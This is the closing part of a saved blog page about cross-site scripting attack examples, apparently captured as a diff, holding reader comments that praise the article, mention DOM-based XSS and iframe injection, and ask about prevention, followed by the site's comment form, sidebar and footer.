+					<dd class="comment odd alt thread-odd thread-alt depth-1">
+<div class="format_text" id="comment-body-199172">
+<p>Its really a good article. I dont understand the code because of I am
+ not developer, but I understand the funda, how hackers used that one .</p>
+</div>
+					</dd>
+					<dt class="comment even thread-even depth-1" id="comment-202292">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-202292" href="#comment-202292" title="Permalink to this comment" rel="nofollow">3</a></span>
+<span class="comment_author">Arindam</span>
+<span class="comment_time">February 28, 2012 at 6:01 am</span>
+
+					</dt>
+					<dd class="comment even thread-even depth-1">
+<div class="format_text" id="comment-body-202292">
+<p>This is really simple and nice walk through using very simple 
+examples to understand what exactly is happening behind the scene. I 
+have struggled understanding XSS in my earlier days.<br>
+I wish I would have had this article before <img src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/icon_smile.gif" alt=":)" class="wp-smiley"> </p>
+</div>
+					</dd>
+					<dt class="comment odd alt thread-odd thread-alt depth-1" id="comment-267699">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-267699" href="#comment-267699" title="Permalink to this comment" rel="nofollow">4</a></span>
+<span class="comment_author">Friedrick</span>
+<span class="comment_time">July 11, 2012 at 3:09 am</span>
+
+					</dt>
+					<dd class="comment odd alt thread-odd thread-alt depth-1">
+<div class="format_text" id="comment-body-267699">
+<p>I think that is missing a relatively old cathegory, but still very difficult to analyze.<br>
+This cathegory is the DOM XSS which can be found here: <a rollapp-href="https://www.owasp.org/index.php/DOM_Based_XSS" href="https://www.owasp.org/index.php/DOM_Based_XSS" rel="nofollow">https://www.owasp.org/index.php/DOM_Based_XSS</a><br>
+This kind of vulnerabilities were historically very hard to spot because
+ hidden in tons of javascript code, which is the most polimorfic kind of
+ language I have ever had to struggle with <img src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/icon_biggrin.gif" alt=":D" class="wp-smiley"> </p>
+<p>Have a look at this beautiful resource: <a rollapp-href="http://code.google.com/p/domxsswiki/wiki/Introduction" href="http://code.google.com/p/domxsswiki/wiki/Introduction" rel="nofollow">http://code.google.com/p/domxsswiki/wiki/Introduction</a></p>
+<p>Fortunately the technology improves over time and now there are some tools to make the job easier:<br>
+- <a rollapp-href="http://www.domxssscanner.com/" href="http://www.domxssscanner.com/" rel="nofollow">http://www.domxssscanner.com</a> (easy to use)<br>
+- <a rollapp-href="http://dominator.mindedsecurity.com/" href="http://dominator.mindedsecurity.com/" rel="nofollow">http://dominator.mindedsecurity.com</a> (opensource and pro trial – very precise and powerful but it crashes from time to time)</p>
+</div>
+					</dd>
+					<dt class="comment even thread-even depth-1" id="comment-418478">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-418478" href="#comment-418478" title="Permalink to this comment" rel="nofollow">5</a></span>
+<span class="comment_author">Kaushik Wavhal</span>
+<span class="comment_time">December 6, 2012 at 3:09 am</span>
+
+					</dt>
+					<dd class="comment even thread-even depth-1">
+<div class="format_text" id="comment-body-418478">
+<p>Hey nice article. Specially the two types persistent and non persistent always used to confuse me.<br>
+wish i had come up to this article before.</p>
+</div>
+					</dd>
+					<dt class="comment odd alt thread-odd thread-alt depth-1" id="comment-918021">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-918021" href="#comment-918021" title="Permalink to this comment" rel="nofollow">6</a></span>
+<span class="comment_author">pyush</span>
+<span class="comment_time">September 5, 2013 at 10:00 am</span>
+
+					</dt>
+					<dd class="comment odd alt thread-odd thread-alt depth-1">
+<div class="format_text" id="comment-body-918021">
+<p>the example are not working for me… please help</p>
+</div>
+					</dd>
+					<dt class="comment even thread-even depth-1" id="comment-1166064">
+<span class="avatar"><a rollapp-href="http://springedge.com/" href="http://springedge.com/" rel="nofollow"></a></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-1166064" href="#comment-1166064" title="Permalink to this comment" rel="nofollow">7</a></span>
+<span class="comment_author"><a rollapp-href="http://springedge.com/" href="http://springedge.com/" rel="external nofollow" class="url">Bindya</a></span>
+<span class="comment_time">January 3, 2014 at 3:51 am</span>
+
+					</dt>
+					<dd class="comment even thread-even depth-1">
+<div class="format_text" id="comment-body-1166064">
+<p>Article is good on xss hack. but it is using script tag. Iframe 
+injuction is also a type of xss. which can load external url to host.</p>
+</div>
+					</dd>
+					<dt class="comment odd alt thread-odd thread-alt depth-1" id="comment-1390814">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-1390814" href="#comment-1390814" title="Permalink to this comment" rel="nofollow">8</a></span>
+<span class="comment_author">Umar Mukthar</span>
+<span class="comment_time">March 25, 2014 at 10:04 pm</span>
+
+					</dt>
+					<dd class="comment odd alt thread-odd thread-alt depth-1">
+<div class="format_text" id="comment-body-1390814">
+<p>nice article. could you please add some examples to prevent from xss 
+attack in java. It will help me a lot to implement on my project, 
+because I do analysis regarding XSS attack.</p>
+</div>
+					</dd>
+					<dt class="comment even thread-even depth-1" id="comment-1424851">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-1424851" href="#comment-1424851" title="Permalink to this comment" rel="nofollow">9</a></span>
+<span class="comment_author">george</span>
+<span class="comment_time">April 3, 2014 at 9:56 am</span>
+
+					</dt>
+					<dd class="comment even thread-even depth-1">
+<div class="format_text" id="comment-body-1424851">
+<p>thanks for that explanation</p>
+</div>
+					</dd>
+				</dl>
+				<div id="respond">
+					<div id="respond_intro">
+						<p>Leave a Comment</p>
+					</div>
+					<form action="http://www.thegeekstuff.com/wp-comments-post.php" method="post" id="commentform">
+						<p><input class="text_input" name="author" id="author" tabindex="1" type="text"><label for="author">Name</label></p>
+						<p><input class="text_input" name="email" id="email" tabindex="2" type="text"><label for="email">E-mail</label></p>
+						<p><input class="text_input" name="url" id="url" tabindex="3" type="text"><label for="url">Website</label></p>
+						<p class="comment_box">
+							<textarea name="comment" id="comment" tabindex="4" cols="40" rows="8"></textarea>
+						</p>
+
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input name="subscribe" id="subscribe" value="subscribe" style="width: auto;" type="checkbox">
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+						<p class="remove_bottom_margin">
+							<input name="submit" class="form_submit" id="submit" tabindex="5" value="Submit" type="submit">
+<input name="comment_post_ID" value="9629" id="comment_post_ID" type="hidden">
+<input name="comment_parent" id="comment_parent" value="0" type="hidden">
+						</p>
+<p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" value="8f2771f166" type="hidden"></p>					</form>
+				</div>
+			</div>
+					<div class="prev_next post_nav">
+						<p class="previous">Previous post: <a rollapp-href="http://www.thegeekstuff.com/2012/02/change-your-world-at-work/" href="http://www.thegeekstuff.com/2012/02/change-your-world-at-work/" rel="prev">10 Things You (and Your Boss) Can Do To Change Your World</a></p>
+						<p>Next post: <a rollapp-href="http://www.thegeekstuff.com/2012/02/linux-memory-management/" href="http://www.thegeekstuff.com/2012/02/linux-memory-management/" rel="next">Linux Memory Management – Virtual Memory and Demand Paging</a></p>
+					</div>
+		</div>
+
+		<div id="sidebars">
+			<div id="sidebar_1" class="sidebar">
+				<ul class="sidebar_list">
+<li class="widget widget_text" id="text-21">			<div class="textwidget"><a rollapp-href="http://www.thegeekstuff.com/feed" title="Subscribe via RSS" href="http://www.thegeekstuff.com/feed" rel="nofollow">RSS</a>&nbsp; | &nbsp;<a rollapp-href="http://feedburner.google.com/fb/a/mailverify?uri=TheGeekStuff&amp;loc=en_US" title="Subscribe via Email" href="http://feedburner.google.com/fb/a/mailverify?uri=TheGeekStuff&amp;loc=en_US" rel="nofollow">Email</a>&nbsp; | &nbsp;<a rollapp-href="http://twitter.com/thegeekstuff" title="Follow us on Twitter" href="http://twitter.com/thegeekstuff" rel="nofollow">Twitter</a>&nbsp; | &nbsp;<a rollapp-href="http://www.facebook.com/thegeekstuff" title="Become a fan" href="http://www.facebook.com/thegeekstuff" rel="nofollow">Facebook</a>&nbsp; | &nbsp;<a rollapp-href="https://plus.google.com/112493711428194838421/posts" title="Follow us on Google+" href="https://plus.google.com/112493711428194838421/posts">Google+</a>
+<br><br>
+<form action="http://www.thegeekstuff.com/search" id="cse-search-box">
+  <div>
+    <input name="cx" value="005666763606120661560:zkmegbt_djm" type="hidden">
+    <input name="cof" value="FORID:10" type="hidden">
+    <input name="ie" value="UTF-8" type="hidden">
+    <input style="border: 1px solid rgb(126, 157, 185); padding: 2px; background: url(&quot;http://www.google.com/cse/intl/en/images/google_custom_search_watermark.gif&quot;) no-repeat scroll left center rgb(255, 255, 255);" name="q" size="40" type="text">
+    <input style="border-color:#CCCCCC #999999 #999999 #CCCCCC; border-style:double; border-width:1px; overflow:visible;" name="sa" value="Search" type="submit">
+  </div>
+<input value="www.thegeekstuff.com/2012/02/xss-attack-examples/" name="siteurl" type="hidden"><input value="www.google.com.tr/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0CC0QFjAA&amp;url=http%3A%2F%2Fwww.thegeekstuff.com%2F2012%2F02%2Fxss-attack-examples%2F&amp;ei=9-NpU5jXELTA7AbhzYDwCw&amp;usg=AFQjCNFSV3gOTHAmD5-1vRVK6m4bE1kfeQ&amp;sig2=hkM_b4cHk6VBbacpKkRZgQ&amp;bvm=bv.66111022,d.ZGU" name="ref" type="hidden"><input name="ss" type="hidden"></form>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/jsapi"></script>
+<script type="text/javascript">google.load("elements", "1", {packages: "transliteration"});</script><script src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/a" type="text/javascript"></script><link href="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/transliteration.css" type="text/css" rel="stylesheet"><script src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/transliteration.js" type="text/javascript"></script>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/t13n"></script>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/brand"></script>
+<br></div>
+		</li><li class="widget widget_text" id="text-3">			<div class="textwidget"><script type="text/javascript"><!--
+google_ad_client = "ca-pub-8090601437064582";
+/* TGS Right Bar Rectangle Text Ad */
+google_ad_slot = "9054077260";
+google_ad_width = 300;
+google_ad_height = 250;
+//-->
+</script>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/show_ads.js">
+</script><ins style="display:inline-table;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><ins id="aswift_2_anchor" style="display:block;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><iframe marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;" frameborder="0" height="250" scrolling="no" width="300"></iframe></ins></ins>
+<br></div>
+		</li><li class="widget widget_text" id="text-18"><h3>COURSE</h3>			<div class="textwidget"><ul>
+<li><a rollapp-href="http://www.thegeekstuff.com/linux-sysadmin/" href="http://www.thegeekstuff.com/linux-sysadmin/">Linux Sysadmin CentOS 6 Course</a> - Master the Tools, Configure it Right, and be Lazy</li>
+</ul></div>
+		</li><li class="widget widget_text" id="text-4"><h3>EBOOKS</h3>			<div class="textwidget"><ul>
+<li><img title="Linux 101 Hacks Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/free-small.png" alt="Linux 101 Hacks Book">&nbsp;<a rollapp-href="http://www.thegeekstuff.com/linux-101-hacks-ebook/" href="http://www.thegeekstuff.com/linux-101-hacks-ebook/">Linux 101 Hacks 2nd Edition eBook</a> - Practical Examples to Build a Strong Foundation in Linux</li>
+<li><a rollapp-href="http://www.thegeekstuff.com/bash-101-hacks-ebook/" href="http://www.thegeekstuff.com/bash-101-hacks-ebook/">Bash 101 Hacks eBook</a> - Take Control of Your Bash Command Line and Shell Scripting</li>
+<li><a rollapp-href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/" href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/">Sed and Awk 101 Hacks eBook</a> - Enhance Your UNIX / Linux Life with Sed and Awk</li>
+<li><a rollapp-href="http://www.thegeekstuff.com/vim-101-hacks-ebook/" href="http://www.thegeekstuff.com/vim-101-hacks-ebook/">Vim 101 Hacks eBook</a> - Practical Examples for Becoming Fast and Productive in Vim Editor</li>
+<li><a rollapp-href="http://www.thegeekstuff.com/nagios-core-ebook/" href="http://www.thegeekstuff.com/nagios-core-ebook/">Nagios Core 3 eBook</a> - Monitor Everything, Be Proactive, and Sleep Well</li>
+</ul></div>
+		</li><li class="widget widget_text" id="text-22">			<div class="textwidget"><iframe src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/likebox.htm" style="border:none; overflow:hidden; height:258px;" allowtransparency="true" frameborder="0" scrolling="no"></iframe></div>
+		</li><li class="widget widget_text" id="text-17"><h3>POPULAR POSTS</h3>			<div class="textwidget"><ul>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/01/12-amazing-and-essential-linux-books-to-enrich-your-brain-and-library/" href="http://www.thegeekstuff.com/2009/01/12-amazing-and-essential-linux-books-to-enrich-your-brain-and-library/">12 Amazing and Essential Linux Books To Enrich Your Brain and Library</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials/" href="http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials/">50 UNIX / Linux Sysadmin Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/11/50-linux-commands/" href="http://www.thegeekstuff.com/2010/11/50-linux-commands/">50 Most Frequently Used UNIX / Linux Commands (With Examples)</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/08/gtd-getting-things-done/" href="http://www.thegeekstuff.com/2010/08/gtd-getting-things-done/">How To Be Productive and Get Things Done Using GTD</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/03/30-things-to-do-when-you-are-bored-and-have-a-computer/" href="http://www.thegeekstuff.com/2010/03/30-things-to-do-when-you-are-bored-and-have-a-computer/">30 Things To Do When you are Bored and have a Computer</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/09/linux-file-system-structure/" href="http://www.thegeekstuff.com/2010/09/linux-file-system-structure/">Linux Directory Structure (File System Structure) Explained with Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/" href="http://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/">Linux Crontab: 15 Awesome Cron Job Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/03/15-practical-unix-grep-command-examples/" href="http://www.thegeekstuff.com/2009/03/15-practical-unix-grep-command-examples/">Get a Grip on the Grep! – 15 Practical Grep Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/07/linux-ls-command-examples/" href="http://www.thegeekstuff.com/2009/07/linux-ls-command-examples/">Unix LS Command: 15 Practical Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/08/15-examples-to-master-linux-command-line-history/" href="http://www.thegeekstuff.com/2008/08/15-examples-to-master-linux-command-line-history/">15 Examples To Master Linux Command Line History</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/08/bug-tracking-system/" href="http://www.thegeekstuff.com/2010/08/bug-tracking-system/">Top 10 Open Source Bug Tracking System</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/01/vi-and-vim-macro-tutorial-how-to-record-and-play/" href="http://www.thegeekstuff.com/2009/01/vi-and-vim-macro-tutorial-how-to-record-and-play/">Vi and Vim Macro Tutorial: How To Record and Play</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples/" href="http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples/">Mommy, I found it! -- 15 Practical Linux Find Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/07/best-gmail-tips-and-tricks/" href="http://www.thegeekstuff.com/2009/07/best-gmail-tips-and-tricks/">15 Awesome Gmail Tips and Tricks</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/06/expertise-in-google-search/" href="http://www.thegeekstuff.com/2009/06/expertise-in-google-search/">15 Awesome Google Search Tips and Tricks</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/08/raid-levels-tutorial/" href="http://www.thegeekstuff.com/2010/08/raid-levels-tutorial/">RAID 0, RAID 1, RAID 5, RAID 10 Explained with Diagrams</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/01/15-practical-unix-linux-top-command-examples/" href="http://www.thegeekstuff.com/2010/01/15-practical-unix-linux-top-command-examples/">Can You Top This? 15 Practical Linux Top Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/09/top-5-best-network-monitoring-tools/" href="http://www.thegeekstuff.com/2009/09/top-5-best-network-monitoring-tools/">Top 5 Best System Monitoring Tools</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/06/top-5-best-linux-os-distributions/" href="http://www.thegeekstuff.com/2009/06/top-5-best-linux-os-distributions/">Top 5 Best Linux OS Distributions</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/06/how-to-monitor-remote-linux-host-using-nagios-30/" href="http://www.thegeekstuff.com/2008/06/how-to-monitor-remote-linux-host-using-nagios-30/">How To Monitor Remote Linux Host using Nagios 3.0</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples/" href="http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples/">Awk Introduction Tutorial – 7 Awk Print Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/09/rsync-command-examples/" href="http://www.thegeekstuff.com/2010/09/rsync-command-examples/">How to Backup Linux? 15 rsync Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/09/the-ultimate-wget-download-guide-with-15-awesome-examples/" href="http://www.thegeekstuff.com/2009/09/the-ultimate-wget-download-guide-with-15-awesome-examples/">The Ultimate Wget Download Guide With 15 Awesome Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/07/top-5-best-linux-text-editors/" href="http://www.thegeekstuff.com/2009/07/top-5-best-linux-text-editors/">Top 5 Best Linux Text Editors</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/08/tcpdump-command-examples/" href="http://www.thegeekstuff.com/2010/08/tcpdump-command-examples/">Packet Analyzer: 15 TCPDUMP Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/06/bash-array-tutorial/" href="http://www.thegeekstuff.com/2010/06/bash-array-tutorial/">The Ultimate Bash Array Tutorial with 15 Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/11/3-steps-to-perform-ssh-login-without-password-using-ssh-keygen-ssh-copy-id/" href="http://www.thegeekstuff.com/2008/11/3-steps-to-perform-ssh-login-without-password-using-ssh-keygen-ssh-copy-id/">3 Steps to Perform SSH Login Without Password Using ssh-keygen &amp; ssh-copy-id</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/10/unix-sed-tutorial-advanced-sed-substitution-examples/" href="http://www.thegeekstuff.com/2009/10/unix-sed-tutorial-advanced-sed-substitution-examples/">Unix Sed Tutorial: Advanced Sed Substitution Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/03/netstat-command-examples/" href="http://www.thegeekstuff.com/2010/03/netstat-command-examples/">UNIX / Linux: 10 Netstat Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/06/the-ultimate-guide-for-creating-strong-passwords/" href="http://www.thegeekstuff.com/2008/06/the-ultimate-guide-for-creating-strong-passwords/">The Ultimate Guide for Creating Strong Passwords</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/08/6-steps-to-secure-your-home-wireless-network/" href="http://www.thegeekstuff.com/2008/08/6-steps-to-secure-your-home-wireless-network/">6 Steps to Secure Your Home Wireless Network</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/08/turbocharge-putty-with-12-powerful-add-ons-software-for-geeks-3/" href="http://www.thegeekstuff.com/2008/08/turbocharge-putty-with-12-powerful-add-ons-software-for-geeks-3/">Turbocharge PuTTY with 12 Powerful Add-Ons</a></li>
+</ul></div>
+		</li><li class="widget widget_text" id="text-19"><h3>CATEGORIES</h3>			<div class="textwidget"><ul>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/linux/" rel="nofollow" href="http://www.thegeekstuff.com/category/linux/">Linux Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/vim-2/" rel="nofollow" href="http://www.thegeekstuff.com/category/vim-2/">Vim Editor</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/sed/" rel="nofollow" href="http://www.thegeekstuff.com/category/sed/">Sed Scripting</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/awk/" rel="nofollow" href="http://www.thegeekstuff.com/category/awk/">Awk Scripting</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/bash-2/" rel="nofollow" href="http://www.thegeekstuff.com/category/bash-2/">Bash Shell Scripting</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/nagios-2/" rel="nofollow" href="http://www.thegeekstuff.com/category/nagios-2/">Nagios Monitoring</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/openssh-2/" rel="nofollow" href="http://www.thegeekstuff.com/category/openssh-2/">OpenSSH</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/iptables/" rel="nofollow" href="http://www.thegeekstuff.com/category/iptables/">IPTables Firewall</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/apache/" rel="nofollow" href="http://www.thegeekstuff.com/category/apache/">Apache Web Server</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/mysql/" rel="nofollow" href="http://www.thegeekstuff.com/category/mysql/">MySQL Database</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/perl/" rel="nofollow" href="http://www.thegeekstuff.com/category/perl/">Perl Programming</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/google/" rel="nofollow" href="http://www.thegeekstuff.com/category/google/">Google Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/ubuntu/" rel="nofollow" href="http://www.thegeekstuff.com/category/ubuntu/">Ubuntu Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/postgresql/" rel="nofollow" href="http://www.thegeekstuff.com/category/postgresql/">PostgreSQL DB</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/hello-world/" rel="nofollow" href="http://www.thegeekstuff.com/category/hello-world/">Hello World Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/c-programming/" rel="nofollow" href="http://www.thegeekstuff.com/category/c-programming/">C Programming</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/c-plus-plus/" rel="nofollow" href="http://www.thegeekstuff.com/category/c-plus-plus/">C++ Programming</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/dell-2/" rel="nofollow" href="http://www.thegeekstuff.com/category/dell-2/">DELL Server Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/oracle/" rel="nofollow" href="http://www.thegeekstuff.com/category/oracle/">Oracle Database</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/category/vmware/" rel="nofollow" href="http://www.thegeekstuff.com/category/vmware/">VMware Tutorials</a></li>
+</ul></div>
+		</li><li class="widget widget_text" id="text-20">			<div class="textwidget"><div id="___person_0" style="text-indent: 0px; margin: 0px; padding: 0px; background: none repeat scroll 0% 0% transparent; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 300px; height: 106px;"><iframe title="+Badge" data-gapiattached="true" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/person.htm" name="I2_1399448585220" id="I2_1399448585220" vspace="0" tabindex="0" style="position: static; top: 0px; width: 300px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 106px;" marginwidth="0" marginheight="0" hspace="0" frameborder="0" scrolling="no" width="100%"></iframe></div></div>
+		</li>				</ul>
+			</div>
+		</div>
+	</div>
+	<div id="footer">
+<div class="col_footer1">
+	<ul class="sidebar_list">
+<li id="text-7" class="widget widget_text"><h3>About The Geek Stuff</h3>			<div class="textwidget"><br>
+<img class="float" title="Ramesh Natarajan" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/ramesh-small.gif" alt="Linux 101 Hacks Book">
+My name is <strong>Ramesh Natarajan</strong>. I will be posting 
+instruction guides, how-to, troubleshooting tips and tricks on Linux, 
+database, hardware, security and web. My focus is to write articles that
+ will either teach you or help you resolve a problem. Read more about <a rollapp-href="http://www.thegeekstuff.com/about/" href="http://www.thegeekstuff.com/about/">Ramesh Natarajan</a> and the blog.</div>
+		</li>
+<li id="text-8" class="widget widget_text"><h3>Support Us</h3>			<div class="textwidget"><br>
+Support this blog by purchasing one of my ebooks.
+<br><br>
+<a rollapp-href="http://www.thegeekstuff.com/bash-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/bash-101-hacks-ebook/">Bash 101 Hacks eBook</a>
+<br><br>
+<a rollapp-href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/">Sed and Awk 101 Hacks eBook</a>
+<br><br>
+<a rollapp-href="http://www.thegeekstuff.com/vim-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/vim-101-hacks-ebook/">Vim 101 Hacks eBook</a>
+<br><br>
+<a rollapp-href="http://www.thegeekstuff.com/nagios-core-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/nagios-core-ebook/">Nagios Core 3 eBook</a></div>
+		</li>
+<li id="text-9" class="widget widget_text"><h3>Contact Us</h3>			<div class="textwidget"><br>
+<strong>Email Me :</strong>
+Use this <a rollapp-href="http://www.thegeekstuff.com/contact" href="http://www.thegeekstuff.com/contact" rel="nofollow">Contact Form</a>
+ to get in touch me with your comments, questions or suggestions about 
+this site. You can also simply drop me a line to say hello!.
+<br><br>
+<a rollapp-href="https://plus.google.com/112493711428194838421/posts" title="Follow us on Google+" href="https://plus.google.com/112493711428194838421/posts">Follow us on Google+</a>
+<br><br>
+<a rollapp-href="http://twitter.com/thegeekstuff" title="Follow us on Twitter" href="http://twitter.com/thegeekstuff" rel="nofollow">Follow us on Twitter</a>
+<br><br>
+<a rollapp-href="http://www.facebook.com/thegeekstuff" href="http://www.facebook.com/thegeekstuff" rel="nofollow">Become a fan on Facebook</a>&nbsp;&nbsp;</div>
+		</li>
+	</ul>
+</div>
+
+<div class="cb"></div>
+	<p>Copyright © 2008–2014 Ramesh Natarajan. All rights reserved  | 
+<a rollapp-href="http://www.thegeekstuff.com/copyright" href="http://www.thegeekstuff.com/copyright">Terms of Service</a> </p>	</div>
+</div>
+</div>
+<!--[if lte IE 8]>
+<div id="ie_clear"></div>
+<![endif]-->
+<script gapi_processed="true" type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/plusone.js"></script>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-5302569-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+<iframe tabindex="-1" style="width: 1px; height: 1px; position: absolute; top: -100px;" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/postmessageRelay.htm" id="oauth2relay458200196" name="oauth2relay458200196"></iframe><iframe style="display: none; width: 0px; height: 0px;" name="google_osd_static_frame" id="google_osd_static_frame_9728708193141"></iframe></body><iframe src="" style="display: none;"></iframe></html>
+<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/
+
+Page Caching using disk: enhanced
+Content Delivery Network via Amazon Web Services: CloudFront: static.thegeekstuff.com
+
+ Served from: www.thegeekstuff.com @ 2014-05-07 01:05:51 by W3 Total Cache -->
